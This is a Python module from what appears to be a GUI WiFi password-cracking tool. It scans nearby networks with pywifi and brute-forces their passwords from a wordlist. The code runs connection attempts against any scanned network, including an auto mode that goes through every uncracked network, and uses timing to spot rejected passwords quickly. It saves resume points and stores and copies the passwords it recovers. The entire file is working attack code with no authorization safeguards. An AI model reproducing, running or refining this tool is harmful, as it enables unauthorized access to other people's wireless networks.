# -*- coding: utf-8 -*-
"""
WiFi Crack - Async Core cracking functionality

This module provides async versions of WiFi cracking operations,
allowing non-blocking UI during long-running operations.
"""
import asyncio
import platform
from itertools import islice
from typing import TYPE_CHECKING, Optional, Dict, List, Union

# Windows 位置服务检查
if platform.system() == "Windows":
    import winreg

import pyperclip
from pywifi import const, PyWiFi, Profile
from pywifi.iface import Interface

from .constants import Colors, Messages, Defaults
from .logger import get_logger
from .async_runner import run_in_thread

if TYPE_CHECKING:
    from .wifi_tool import WifiCrackTool


class AsyncCrack:
    """Async WiFi password cracking class"""
    
    def __init__(self, tool: 'WifiCrackTool'):
        """
        Initialize AsyncCrack instance
        
        :param tool: WifiCrackTool instance
        """
        self.tool = tool
        self.win = tool.win
        self.ui = tool.ui
        self.logger = get_logger()
        
        # WiFi interface
        self.wifi = PyWiFi()
        self.wnics = self.wifi.interfaces()
        self.iface: Optional[Interface] = None
        
        # WiFi data
        self.ssids: List[str] = []
        self.profile_dict: Dict[str, Profile] = {}
        
        # State
        self.convert_success = False
        self.is_auto = False
        self.current_ssid: str = ""
        self.current_position: int = 0
        
        # Cancellation flag
        self._cancelled = False
        
        # Initialize wireless adapter
        self._init_wnic()
    
    # ==================== 辅助方法 ====================
    
    def _show_warning_and_reset(self, title: str, message: str, 
                                 log_prefix: str = "[警告]", 
                                 color: str = Colors.ORANGE,
                                 reset: bool = True) -> None:
        """统一处理警告消息并可选地重置控件状态"""
        self.win.show_warning.send(title, message)
        self.win.show_msg.send(f"{log_prefix}{message}\n\n", color)
        if reset:
            self.win.reset_controls_state.send()
    
    def _show_error_and_reset(self, title: str, message: str,
                               error: Optional[Exception] = None,
                               reset: bool = True) -> None:
        """统一处理错误消息并可选地重置控件状态"""
        error_msg = f"{message} {error}" if error else message
        self.logger.error(error_msg)
        self.win.show_error.send(title, error_msg)
        self.win.show_msg.send(f"[错误]{error_msg}\n\n", Colors.RED)
        if reset:
            self.win.reset_controls_state.send()
    
    def _show_status_msg(self, message: str, color: str = Colors.BLACK) -> None:
        """发送状态消息（不显示对话框）"""
        self.win.show_msg.send(message, color)
    
    def cancel(self) -> None:
        """Cancel current operation"""
        self._cancelled = True
    
    def reset_cancel(self) -> None:
        """Reset cancellation flag"""
        self._cancelled = False
    
    def _check_location_service(self) -> bool:
        """
        检查 Windows 位置服务是否开启
        
        在 Windows 10/11 中，WiFi 扫描需要位置服务开启才能正常工作。
        如果位置服务未开启，pywifi 会出现 NULL pointer access 错误。
        
        :return: True 如果位置服务已开启或非 Windows 系统，False 如果未开启
        """
        if platform.system() != "Windows":
            return True
        
        try:
            # 检查系统级位置服务开关
            # 位置: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location"
            
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ)
                value, _ = winreg.QueryValueEx(key, "Value")
                winreg.CloseKey(key)
                
                if value == "Deny":
                    self.logger.warning("系统位置服务已关闭")
                    return False
            except FileNotFoundError:
                # 注册表键不存在，尝试旧版本路径
                pass
            except Exception as e:
                self.logger.debug(f"检查系统位置服务时出错: {e}")
            
            # 检查用户级位置服务开关
            # 位置: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
                value, _ = winreg.QueryValueEx(key, "Value")
                winreg.CloseKey(key)
                
                if value == "Deny":
                    self.logger.warning("用户位置服务已关闭")
                    return False
            except FileNotFoundError:
                pass
            except Exception as e:
                self.logger.debug(f"检查用户位置服务时出错: {e}")
            
            # 检查 Windows Location 服务是否运行（lfsvc）
            try:
                import subprocess
                result = subprocess.run(
                    ['sc', 'query', 'lfsvc'],
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                if 'RUNNING' not in result.stdout:
                    self.logger.warning("Windows 位置服务(lfsvc)未运行")
                    # 服务未运行不一定影响WiFi扫描，只记录警告
            except Exception as e:
                self.logger.debug(f"检查位置服务运行状态时出错: {e}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"检查位置服务时发生错误: {e}")
            # 出错时假设服务已开启，不阻止用户使用
            return True
    
    def _init_wnic(self) -> None:
        """Initialize wireless network adapter"""
        try:
            if len(self.wnics) > 0:
                self.tool.show_msg(Messages.WNIC_FOUND.format(count=len(self.wnics)))
                for i, wnic in enumerate(self.wnics):
                    self.ui.cbo_wnic.addItem(wnic.name(), i)
                self.ui.cbo_wnic.setEnabled(True)
                self.ui.btn_refresh_wifi.setEnabled(True)
            else:
                self.win.showwarning(
                    title='警告',
                    message='无法获取到无线网卡！\n请确保你的电脑拥有无线网卡再继续使用。'
                )
                self.tool.show_msg('无法获取到无线网卡！\n请确保你的电脑拥有无线网卡才可继续使用。\n\n')
        except Exception as e:
            self.logger.error(f"获取无线网卡时发生错误: {e}")
            self.win.showerror(title='错误警告', message=f'获取无线网卡时发生未知错误 {e}')
            self.tool.show_msg(f"[错误]获取无线网卡时发生未知错误 {e}\n\n", Colors.RED)
            self.tool.reset_controls_state()
    
    # ==================== 异步扫描方法 ====================
    
    async def search_wifi(self) -> None:
        """Async scan for nearby WiFi networks"""
        try:
            # 检查位置服务是否开启
            if not self._check_location_service():
                self._show_warning_and_reset(
                    '位置服务未开启',
                    'Windows 位置服务未开启！\n\n'
                    'WiFi 扫描功能需要开启位置服务才能正常工作。\n\n'
                    '请按以下步骤开启：\n'
                    '1. 打开 Windows 设置\n'
                    '2. 进入「隐私和安全性」→「位置」\n'
                    '3. 开启「位置服务」开关\n\n'
                    '或者按 Win+I 打开设置，搜索「位置」进行设置。'
                )
                return
            
            # Validate wireless adapter
            if not self.wnics or len(self.wnics) == 0:
                self._show_warning_and_reset('警告', Messages.NO_WNIC_FOUND)
                return
            
            wnic_index = self.ui.cbo_wnic.currentData()
            if wnic_index is None or wnic_index >= len(self.wnics) or wnic_index < 0:
                self._show_warning_and_reset('警告', '选择的无线网卡无效！')
                return
            
            self.iface = self.wnics[wnic_index]
            name = self.iface.name()
            
            # Check adapter status (run in thread as it may block)
            try:
                iface_status = await run_in_thread(self.iface.status)
                self._show_status_msg(f"网卡状态: {iface_status}\n", Colors.BLUE)
                
                valid_statuses = [
                    const.IFACE_DISCONNECTED, 
                    const.IFACE_INACTIVE, 
                    const.IFACE_SCANNING, 
                    const.IFACE_CONNECTED
                ]
                if iface_status not in valid_statuses:
                    self._show_warning_and_reset(
                        '警告',
                        f'网卡状态异常！当前状态: {iface_status}\n请检查WLAN是否已打开。'
                    )
                    return
            except Exception as e:
                self._show_warning_and_reset(
                    '警告', 
                    f'无法获取网卡状态！\n错误: {e}\n请检查WLAN是否已打开。'
                )
                return
            
            # Start scanning (run in thread)
            try:
                await run_in_thread(self.iface.scan)
                self._show_status_msg(Messages.SCANNING_WIFI.format(name=name))
            except Exception as e:
                self._show_warning_and_reset(
                    '警告',
                    f'启动WiFi扫描失败！\n\n错误: {type(e).__name__}: {e}\n\n'
                    '可能原因：\n1. WLAN服务未启动\n2. 网卡驱动问题\n3. WiFi功能被禁用'
                )
                return
            
            # Wait for scan (async sleep - non-blocking!)
            await asyncio.sleep(self.tool.config.scan_time)
            
            # Get scan results (run in thread)
            try:
                ap_list = await run_in_thread(self.iface.scan_results)
                
                if ap_list is None:
                    self._show_warning_and_reset(
                        '警告',
                        '扫描结果为空（None）！\n\n请尝试：\n1. 关闭WiFi后重新打开\n2. 重启WLAN AutoConfig服务'
                    )
                    return
            except Exception as e:
                self._show_warning_and_reset('警告', f'获取扫描结果失败！\n错误: {e}')
                return
            
            # Remove duplicates
            ap_dict_tmp = {}
            for ap in ap_list:
                if ap.ssid.strip():
                    ap_dict_tmp[ap.ssid] = ap
            
            ap_list = list(ap_dict_tmp.values())
            
            self._show_status_msg(Messages.SCAN_COMPLETE)
            
            # Build profile dictionary
            self.ssids = []
            self.profile_dict = {}
            
            for i, data in enumerate(ap_list):
                ssid = data.ssid
                self.ssids.append(ssid)
                
                profile = Profile()
                profile.ssid = data.ssid
                profile.auth = data.auth
                profile.akm = data.akm
                profile.cipher = data.cipher
                self.profile_dict[data.ssid] = profile
            
            self.win.reset_controls_state.send()
            self.win.add_wifi_items.send(self.ssids)
            
            if self.ssids:
                self.win.set_wifi_current_index.send(0)
                
        except Exception as e:
            error_type = type(e).__name__
            error_msg = str(e)
            
            self.logger.error(f"扫描wifi时发生错误: {error_type}: {error_msg}")
            self._show_status_msg(f"[调试]异常类型: {error_type}, 异常信息: {error_msg}\n", Colors.BLUE)
            
            if "NULL pointer access" in error_msg or "NoneType" in error_msg or error_type == "OSError":
                self._show_warning_and_reset(
                    '警告',
                    f'你当前设备的WLAN未打开或无线网卡不可用！\n\n详细信息: {error_type}: {error_msg}'
                )
            else:
                self._show_error_and_reset('错误警告', f'扫描wifi时发生未知错误\n\n{error_type}: {error_msg}')
            
            self.win.reset_controls_state.send()
    
    # ==================== 异步破解方法 ====================
    
    async def auto_crack(self, start_position: int = 0) -> Optional[bool]:
        """
        Async auto crack all scanned WiFi networks
        
        :param start_position: Resume position (-1 for unified resume handling)
        :return: False on error, None otherwise
        """
        try:
            self.is_auto = True
            self.reset_cancel()
            self._show_status_msg(Messages.AUTO_CRACK_START, Colors.BLUE)
            
            # Get already cracked SSIDs
            cracked_ssids = [item['ssid'] for item in self.tool.config.pwd_dict_data]
            uncracked_ssids = [ssid for ssid in self.ssids if ssid not in cracked_ssids]
            
            if not uncracked_ssids:
                self._show_status_msg(Messages.ALL_CRACKED, Colors.GREEN)
                self.win.show_info.send('自动破解', Messages.ALL_CRACKED.strip())
                self.is_auto = False
                self.win.reset_controls_state.send()
                return
            
            # Display pending WiFis
            wifi_info = "待破解WiFi列表：\n"
            for i, ssid in enumerate(uncracked_ssids, 1):
                wifi_info += f"{'&nbsp;' * 40}({i}){'&nbsp;' * 10}{ssid}\n"
            self._show_status_msg(wifi_info, Colors.BLUE)
            
            pwds = {}
            colors = {}
            
            for ssid in uncracked_ssids:
                if self._cancelled:
                    break
                    
                if start_position == -1:
                    # Use unified resume handling
                    resume_info = self.tool.config.resume_info
                    pwd_file = self.tool.config.pwd_txt_path
                    
                    if (not self.tool.pwd_file_changed and 
                        ssid in resume_info and 
                        resume_info[ssid]['pwd_file'] == pwd_file):
                        start_pos = resume_info[ssid]['position']
                    else:
                        start_pos = 0
                    pwd = await self.crack(ssid, start_pos)
                else:
                    pwd = await self._crack_single_wifi(ssid)
                
                if isinstance(pwd, str):
                    pwds[ssid] = pwd
                    colors[ssid] = Colors.GREEN
                else:
                    pwds[ssid] = "破解失败"
                    colors[ssid] = Colors.RED
            
            self._show_status_msg(Messages.AUTO_CRACK_COMPLETE, Colors.BLUE)
            
            # Display results
            crack_result_info = "结果如下：\n"
            for i, ssid in enumerate(uncracked_ssids, 1):
                crack_result_info += (
                    f"<span style='color:{colors.get(ssid, Colors.RED)}'>"
                    f"{'&nbsp;' * 40}({i}){'&nbsp;' * 10}{ssid}{'&nbsp;' * 10}{pwds.get(ssid, '未完成')}"
                    f"</span>\n"
                )
            
            self._show_status_msg(crack_result_info, Colors.BLUE)
            self.win.show_info.send('自动破解', "自动破解已完成！破解结果已记录到日志中")
            
            self.is_auto = False
            self.win.reset_controls_state.send()
            
        except asyncio.CancelledError:
            self._show_status_msg(Messages.CRACK_TERMINATED, Colors.RED)
            self.is_auto = False
            self.win.reset_controls_state.send()
            return False
        except Exception as e:
            self._show_error_and_reset('错误警告', '自动破解过程中发生未知错误', e)
            self.is_auto = False
            return False
    
    async def _crack_single_wifi(self, ssid: str) -> Union[str, bool]:
        """
        Async crack single WiFi with resume support
        
        :param ssid: WiFi SSID
        :return: Password string on success, False on failure
        """
        resume_info = self.tool.config.resume_info
        pwd_file = self.tool.config.pwd_txt_path
        
        start_position = 0
        if (not self.tool.pwd_file_changed and 
            ssid in resume_info and 
            resume_info[ssid]['pwd_file'] == pwd_file):
            start_position = resume_info[ssid]['position']
        
        return await self.crack(ssid, start_position)
    
    async def crack(self, ssid: str, start_position: int = 0) -> Union[str, bool]:
        """
        Async crack WiFi password
        
        :param ssid: WiFi SSID
        :param start_position: Starting position for resume
        :return: Password string on success, False on failure
        """
        try:
            self.current_ssid = ssid
            self.reset_cancel()
            
            # Check password dictionary first
            pwd_dict_data = self.tool.config.pwd_dict_data
            if pwd_dict_data:
                matching_entries = [entry for entry in pwd_dict_data if entry['ssid'] == ssid]
                
                if matching_entries:
                    self._show_status_msg(
                        f"在密码字典中发现已破解的WiFi [{ssid}]，尝试连接...\n\n",
                        Colors.GREEN
                    )
                    
                    for i, entry in enumerate(matching_entries, 1):
                        if not self.tool.run or self._cancelled:
                            self._show_status_msg(Messages.CRACK_TERMINATED, Colors.RED)
                            self.win.reset_controls_state.send()
                            return False
                        
                        pwd = entry['pwd']
                        result = await self._connect(ssid, pwd, 'json', i)
                        
                        if result and not self.is_auto:
                            self.win.show_info.send(
                                '破解成功',
                                f"使用字典中的密码连接成功，密码：{pwd}\n(已复制到剪切板)"
                            )
                            self.win.reset_controls_state.send()
                            return True
                        elif result:
                            return pwd
                    
                    self._show_status_msg(
                        f"已尝试完密码字典中[{ssid}]的所有密码，均连接失败\n\n",
                        Colors.RED
                    )
            
            # Disconnect current connection
            await run_in_thread(self.iface.disconnect)
            self._show_status_msg(Messages.DISCONNECTING)
            await asyncio.sleep(1)
            
            status = await run_in_thread(self.iface.status)
            if status in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
                self._show_status_msg(Messages.DISCONNECT_SUCCESS)
            else:
                self._show_status_msg(Messages.DISCONNECT_FAILED, Colors.RED)
                return False
            
            self._show_status_msg(f"正在准备破解WiFi[{ssid}]...\n\n")
            self._show_status_msg(f"开始尝试使用密码本破解WiFi[{ssid}]...\n\n")
            
            # Use itertools.islice for efficient file reading
            pwd_path = self.tool.config.pwd_txt_path
            
            with open(pwd_path, 'r', encoding='utf-8', errors='ignore') as f:
                # Skip to start position if resuming
                if start_position > 0:
                    self._show_status_msg(
                        Messages.RESUME_FROM.format(position=start_position),
                        Colors.BLUE
                    )
                    lines = islice(f, start_position - 1, None)
                    current_position = start_position - 1
                else:
                    lines = f
                    current_position = 0
                
                for line in lines:
                    current_position += 1
                    self.current_position = current_position
                    
                    # Check pause (using async-friendly approach)
                    while self.tool.paused and not self._cancelled:
                        self._show_status_msg(Messages.CRACK_PAUSED, Colors.ORANGE)
                        await asyncio.sleep(0.5)
                    
                    # Check stop
                    if not self.tool.run or self._cancelled:
                        self._show_status_msg(Messages.CRACK_TERMINATED, Colors.RED)
                        self.tool.config.save_resume_info(ssid, 'txt', pwd_path, current_position)
                        self.win.reset_controls_state.send()
                        return False
                    
                    # 每N次检测WiFi是否仍然可用（使用配置值）
                    check_interval = self.tool.config.wifi_check_interval
                    if current_position % check_interval == 0:
                        if not await self._check_wifi_available(ssid):
                            rollback = self.tool.config.wifi_rollback
                            self._show_status_msg(
                                f"[警告] WiFi [{ssid}] 已不可用，停止破解并保存进度"
                                f"（回退{rollback}次）\n\n",
                                Colors.ORANGE
                            )
                            # 将位置往前调整
                            save_position = max(1, current_position - rollback)
                            self.tool.config.save_resume_info(ssid, 'txt', pwd_path, save_position)
                            self.win.reset_controls_state.send()
                            return False
                    
                    pwd = line.strip()
                    
                    # Skip invalid passwords
                    if len(pwd) < Defaults.MIN_PASSWORD_LENGTH or len(pwd) > Defaults.MAX_PASSWORD_LENGTH:
                        continue
                    
                    result = await self._connect(ssid, pwd, 'txt', current_position)
                    
                    if result and not self.is_auto:
                        self.win.show_info.send('破解成功', f"连接成功，密码：{pwd}\n(已复制到剪切板)")
                        self.tool.config.clear_resume_info(ssid)
                        self.win.reset_controls_state.send()
                        return True
                    elif result:
                        self.tool.config.clear_resume_info(ssid)
                        return pwd
                    
                    # Yield control to event loop periodically
                    if current_position % 5 == 0:
                        await asyncio.sleep(0)
                
                if not self.is_auto:
                    self.win.show_info.send('破解失败', Messages.CRACK_COMPLETE)
                    self.tool.config.clear_resume_info(ssid)
                    self.win.reset_controls_state.send()
            
            return False
            
        except asyncio.CancelledError:
            self._show_status_msg(Messages.CRACK_TERMINATED, Colors.RED)
            self.tool.config.save_resume_info(ssid, 'txt', self.tool.config.pwd_txt_path, self.current_position)
            self.win.reset_controls_state.send()
            return False
        except Exception as e:
            self._show_error_and_reset('错误警告', '破解过程中发生未知错误', e)
            return False
    
    async def _check_wifi_available(self, ssid: str) -> bool:
        """
        Async check if WiFi is still available by scanning
        
        :param ssid: WiFi SSID to check
        :return: True if WiFi is found, False otherwise
        """
        try:
            self._show_status_msg(f"[检测] 正在检查WiFi [{ssid}] 是否可用...\n", Colors.BLUE)
            
            # 先断开连接以确保扫描结果是最新的
            await run_in_thread(self.iface.disconnect)
            await asyncio.sleep(Defaults.WIFI_DISCONNECT_WAIT)
            
            # 进行多次扫描确认，避免因信号波动导致误判
            for scan_attempt in range(Defaults.WIFI_CHECK_RETRY_COUNT):
                await run_in_thread(self.iface.scan)
                await asyncio.sleep(Defaults.WIFI_SCAN_WAIT_TIME)
                
                ap_list = await run_in_thread(self.iface.scan_results)
                
                if ap_list is None:
                    if scan_attempt == 0:
                        self._show_status_msg(f"[警告] 第一次扫描结果为空，重试...\n", Colors.ORANGE)
                        continue
                    self._show_status_msg(f"[警告] 扫描结果为空\n", Colors.ORANGE)
                    return False
                
                # Check if target SSID exists
                found = any(ap.ssid.strip() == ssid for ap in ap_list)
                
                if found:
                    self._show_status_msg(f"[检测] WiFi [{ssid}] 仍然可用，继续破解...\n\n", Colors.GREEN)
                    return True
                elif scan_attempt == 0:
                    # 第一次没找到，进行二次扫描确认
                    self._show_status_msg(f"[检测] 第一次扫描未找到，进行二次确认...\n", Colors.ORANGE)
                    await asyncio.sleep(Defaults.WIFI_SCAN_RETRY_WAIT)
                    continue
            
            # 多次扫描都没找到
            self._show_status_msg(
                f"[检测] WiFi [{ssid}] 连续{Defaults.WIFI_CHECK_RETRY_COUNT}次扫描均未找到\n", 
                Colors.ORANGE
            )
            return False
            
        except Exception as e:
            self.logger.error(f"检测WiFi可用性时发生错误: {e}")
            self._show_status_msg(f"[错误] 检测WiFi可用性时发生错误: {e}\n", Colors.RED)
            # 出错时假设WiFi不可用，安全起见停止破解
            return False
    
    async def _connect(self, ssid: str, pwd: str, filetype: str, count: int) -> bool:
        """
        Async attempt to connect to WiFi
        
        :param ssid: WiFi SSID
        :param pwd: Password to try
        :param filetype: Source type ('json' or 'txt')
        :param count: Attempt count
        :return: True on successful connection
        """
        try:
            await run_in_thread(self.iface.disconnect)
            
            # Get security type
            akm_text = self.ui.cbo_security_type.currentText()
            akm_index = self.ui.cbo_security_type.currentIndex()
            
            # Get AKM value based on platform
            akm_value = const.AKM_TYPE_NONE
            if platform.system() == "Windows":
                from pywifi import _wifiutil_win
                akm_dict = _wifiutil_win.akm_str_to_value_dict
            elif platform.system() == "Linux":
                from pywifi import _wifiutil_linux
                akm_dict = _wifiutil_linux.display_str_to_key
            else:
                akm_dict = {}
            
            if akm_text in akm_dict:
                akm_value = akm_dict[akm_text]
            
            # Create profile
            if akm_index == 0:
                # Auto mode - use scanned profile
                profile = self.profile_dict.get(ssid, Profile())
            else:
                profile = Profile()
                profile.ssid = ssid
                profile.auth = const.AUTH_ALG_OPEN
                profile.akm = akm_value
                profile.cipher = const.CIPHER_TYPE_CCMP
            
            profile.key = pwd
            
            await run_in_thread(self.iface.remove_network_profile, profile)
            temp_profile = await run_in_thread(self.iface.add_network_profile, profile)
            
            # Try connection with smart failure detection
            max_retries = self.tool.config.max_retries  # 使用配置值
            auth_fail_threshold = Defaults.AUTH_FAIL_THRESHOLD
            base_timeout = self.tool.config.connect_time
            
            for attempt in range(max_retries):
                # 重试前确保完全断开
                if attempt > 0:
                    await run_in_thread(self.iface.disconnect)
                    disconnect_start = asyncio.get_event_loop().time()
                    while asyncio.get_event_loop().time() - disconnect_start < Defaults.DISCONNECT_WAIT_TIMEOUT:
                        status = await run_in_thread(self.iface.status)
                        if status in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
                            break
                        await asyncio.sleep(Defaults.DISCONNECT_CHECK_INTERVAL)
                
                # 渐进式超时：第一次正常，第二次+1秒，第三次+2秒
                extra_time = attempt  # 0, 1, 2
                connect_timeout = base_timeout + extra_time
                
                if attempt > 0:
                    self._show_status_msg(f"第{attempt + 1}次重试 (超时: {connect_timeout:.1f}s)...\n", Colors.BLUE)
                else:
                    self._show_status_msg(f"正在进行第{count}次尝试...\n", Colors.BLACK)
                
                await run_in_thread(self.iface.connect, temp_profile)
                
                connect_start_time = asyncio.get_event_loop().time()
                was_connecting = False
                connecting_start_time = None
                failure_reason = None
                
                while asyncio.get_event_loop().time() - connect_start_time < connect_timeout:
                    # 动态检测间隔：连接中时快速检测
                    check_interval = Defaults.CHECK_INTERVAL_FAST if was_connecting else Defaults.CHECK_INTERVAL_SLOW
                    await asyncio.sleep(check_interval)
                    status = await run_in_thread(self.iface.status)
                    
                    # Success - connected!
                    if status == const.IFACE_CONNECTED:
                        self._show_status_msg(
                            Messages.CRACK_SUCCESS.format(pwd=pwd),
                            Colors.GREEN
                        )
                        pyperclip.copy(pwd)
                        
                        if filetype != 'json':
                            self.tool.config.save_pwd_dict(ssid, pwd)
                        
                        return True
                    
                    # Track when we entered connecting state
                    if status == const.IFACE_CONNECTING:
                        if not was_connecting:
                            was_connecting = True
                            connecting_start_time = asyncio.get_event_loop().time()
                    
                    # Early failure detection
                    if was_connecting and status in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
                        connect_duration = asyncio.get_event_loop().time() - connecting_start_time if connecting_start_time else 0
                        
                        if connect_duration < auth_fail_threshold:
                            # 快速失败 = 认证被拒绝 (密码错误) - 不需要重试
                            failure_reason = "auth_failed"
                            self._show_status_msg(f"[快速拒绝] 密码错误 (耗时 {connect_duration:.2f}s)\n", Colors.RED)
                        else:
                            # 慢速失败 = 可能是网络问题 - 需要重试
                            failure_reason = "network_issue"
                            self._show_status_msg(f"[网络问题?] 连接中断 (耗时 {connect_duration:.2f}s)\n", Colors.ORANGE)
                        break
                else:
                    # 超时 - 可能是网络问题或密码正确但信号弱
                    failure_reason = "timeout"
                    self._show_status_msg(f"[超时] 连接超时 ({connect_timeout:.1f}s)\n", Colors.ORANGE)
                
                # 快速拒绝的不重试，直接判定密码错误
                if failure_reason == "auth_failed":
                    break
                
                # 如果是网络问题或超时，用更长的超时重试
                if failure_reason in ["network_issue", "timeout"] and attempt < max_retries - 1:
                    self._show_status_msg(f"可能是网络问题，将用更长超时重试...\n", Colors.BLUE)
                    continue
                
                await asyncio.sleep(Defaults.POST_FAIL_WAIT)
            
            # Connection failed
            self._show_status_msg(Messages.CRACK_FAILED.format(pwd=pwd), Colors.RED)
            await run_in_thread(self.iface.remove_network_profile, profile)
            return False
            
        except Exception as e:
            self._show_error_and_reset('错误警告', '连接wifi过程中发生未知错误', e)
            return False
